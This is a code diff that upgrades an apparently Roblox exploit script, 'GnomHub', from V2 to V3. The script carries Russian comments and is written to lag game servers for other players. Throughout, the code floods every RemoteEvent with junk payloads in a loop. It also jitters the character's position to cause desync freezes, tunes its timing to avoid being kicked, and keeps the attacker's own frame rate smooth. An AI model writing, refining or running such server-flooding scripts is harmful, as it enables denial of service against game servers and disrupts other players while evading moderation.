@@ -1,64 +1,66 @@
 --[[
-    GnomHub V2 - Network Dominance Script
-    Target: Server-Wide Lag (Excluding User)
-    Optimization: Zero-Point Protocol
+    GnomHub V3 - Ghost-Lag (Zero-Point Edition)
+    Status: Invisible for User / Chaos for Others
+    Target: Server Network & Remote Saturation
 ]]
 
 if getgenv().GnomHubRunning then return end
 getgenv().GnomHubRunning = true
 
 local RunService = game:GetService("RunService")
-local NetworkClient = game:GetService("NetworkClient")
-local RemoteEvents = {}
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
--- Поиск всех доступных RemoteEvents для спама
-for _, v in pairs(game:GetDescendants()) do
-    if v:IsA("RemoteEvent") then
-        table.insert(RemoteEvents, v)
+-- 1. Полная очистка вашего экрана от визуальных лагов
+local function CleanMyClient()
+    -- Удаляем все лагающие GUI, если они остались от прошлых версий
+    if LocalPlayer.PlayerGui:FindFirstChild("GnomHub_Overload") then
+        LocalPlayer.PlayerGui.GnomHub_Overload:Destroy()
     end
+    
+    -- Оптимизируем настройки для плавности вашего экрана
+    settings().Rendering.QualityLevel = 1
+    RunService:Set3dRenderingEnabled(true) -- Оставляем рендер включенным, но на минимуме
 end
 
--- Создаем огромный пакет данных (Payload), который сервер будет рассылать другим
-local heavyData = {}
-for i = 1, 5000 do
-    heavyData[i] = "GNOM_HUB_ZERO_POINT_" .. i
+-- 2. "Мусорный" пакет данных (максимально тяжелый для других клиентов)
+local junkTable = {}
+for i = 1, 3000 do
+    junkTable[string.rep("Gnom", 20)] = string.rep("Hub", 20)
 end
 
--- 1. Сетевой шторм (Lag for others)
--- Мы используем task.spawn, чтобы спам не вешал ваш поток исполнения
+-- 3. Сетевая атака (Remote Flood)
+-- Мы находим все RemoteEvents и спамим ими СЕРВЕР, чтобы он рассылал мусор другим
 task.spawn(function()
     while getgenv().GnomHubRunning do
-        for _, event in ipairs(RemoteEvents) do
-            -- Отправляем данные на сервер. Сервер попытается синхронизировать это с другими игроками.
-            event:FireServer(heavyData)
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("RemoteEvent") and v.Name ~= "CharacterSoundEvent" then
+                -- FireServer отправляет данные на сервер, который нагружает других при попытке обновления
+                v:FireServer(junkTable)
+            end
         end
-        -- Небольшая пауза, чтобы ваш интернет-канал не "захлебнулся" первым
-        task.wait(0.05) 
+        -- Пауза 0.2 сек, чтобы ваш интернет не вылетел (Anti-Kick Buffer)
+        task.wait(0.2)
     end
 end)
 
--- 2. Физический лаг (Physics Stress)
--- Создаем объекты, которые реплицируются (копируются) всем игрокам
+-- 4. Процессорный лаг для других (Physics Desync)
+-- Мы заставляем сервер постоянно пересчитывать ваши координаты, что вызывает "фризы" у тех, кто на вас смотрит
 task.spawn(function()
     while getgenv().GnomHubRunning do
-        -- Пытаемся вызвать лаг через систему репликации звуков/эффектов
-        -- Это заставляет чужие клиенты постоянно обрабатывать новые данные
-        for i = 1, 10 do
-            local p = Instance.new("RemoteEvent")
-            p.Parent = game.ReplicatedStorage
-            task.delay(0.1, function() p:Destroy() end)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = LocalPlayer.Character.HumanoidRootPart
+            -- Быстрая смена координат на микро-дистанции (незаметно для глаза, тяжело для сети)
+            local oldCFrame = hrp.CFrame
+            hrp.CFrame = hrp.CFrame * CFrame.new(0.01, 0.01, 0.01)
+            RunService.Stepped:Wait()
+            hrp.CFrame = oldCFrame
         end
-        task.wait(0.1)
+        task.wait(0.01)
     end
 end)
 
--- 3. Защита вашего FPS (FPS Booster для себя)
--- Отключаем отображение тяжелых эффектов только для вас
-settings().Rendering.QualityLevel = 1
-for _, v in pairs(workspace:GetDescendants()) do
-    if v:IsA("BasePart") and (v.Material == Enum.Material.Glass or v.Material == Enum.Material.Neon) then
-        v.Material = Enum.Material.Plastic
-    end
-end
-
-print("GnomHub V2: Сетевая доминация активирована. Лаг распределен по серверу.")
+-- Инициализация
+CleanMyClient()
+print("GnomHub V3: Протокол скрытого лага запущен. Ваш FPS в безопасности.")
